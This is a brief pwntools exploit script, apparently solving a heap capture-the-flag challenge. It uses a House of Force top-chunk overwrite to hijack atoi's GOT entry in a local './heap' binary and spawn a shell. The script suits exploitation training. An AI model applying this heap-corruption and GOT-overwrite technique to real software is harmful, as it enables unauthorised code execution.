#!/usr/bin/python

from pwn import *

def add(sz, content):
    p.sendlineafter("choice :", "1")
    p.sendlineafter("Size :", str(sz))
    p.sendafter("Content :", content)

def delete(idx):
    p.sendlineafter("choice :", "3")
    p.sendlineafter("Index :", str(idx))

def edit(idx, sz, content):
    p.sendlineafter("choice :", "4")
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Size :", str(sz))
    p.sendafter("Content :", content)


p = process("./heap")
gdb.attach(p, execute = "c")

# prepare heap
add(0x1c, "aaaa")
p.recvuntil("@ ")
heap_base = int(p.recvline()[:-1], 16)
top_chunk = heap_base + 0x18
log.info("Top chunk : " + hex(top_chunk))

# overwrite top chunk size -> 0xFFFFFFFF
edit(0, 0x20, "a"*0x1c + p32(0xFFFFFFFF))
raw_input()

# malloc large heap
target_addr = 0x804A058
nb = target_addr - top_chunk
nb = nb - 4
add(nb, "aaaa")
raw_input()

# malloc overlap chunk and overwrite got entry
got_atoi  = 0x0804A034
get_shell = 0x0804865C
add(0x1c, p32(got_atoi))
edit(0, 4, p32(get_shell))

# get shell
p.sendlineafter("choice :", "1")

p.interactive()